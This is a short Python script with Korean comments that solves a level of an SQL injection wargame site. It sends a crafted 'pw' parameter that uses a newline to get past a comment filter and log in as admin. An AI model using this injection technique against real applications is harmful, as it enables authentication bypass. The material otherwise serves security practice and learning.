import requests

url = "http://los.rubiya.kr/dragon_51996aa769df79afbf79eb4d66dbcef6.php"

headers = {
    "Cookie": "PHPSESSID=pkpf9vsq7hhb1tu5lg6dlpomf7"
}
#guest가 no 또는 최상위 레코드라 생각될 수 있고
# 주석 #을 우회하기 위해 %0a를 사용한다.
#' and 0 or id='admin' 과 ' or id='admin'은 실제 우분투에서 했을 때는 큰 차이가 없다.
#하지만 los에서는 뒤의것처럼 먹히지가 않는당 ㅠ 
#여기서는 앞의 것을 확실히 0으로 만들어주기 위한 쿼리를 유연하게 할 수 있는 것을 할 수 있는 것을 터득하자.
#내가볼때 and가 우선순위임
#1 and (pw='' and 0) or 1

params = {
    "pw":"'\x0a and 0 or id='admin'#"
}

res = requests.get(url, params=params, headers=headers)
print res.content




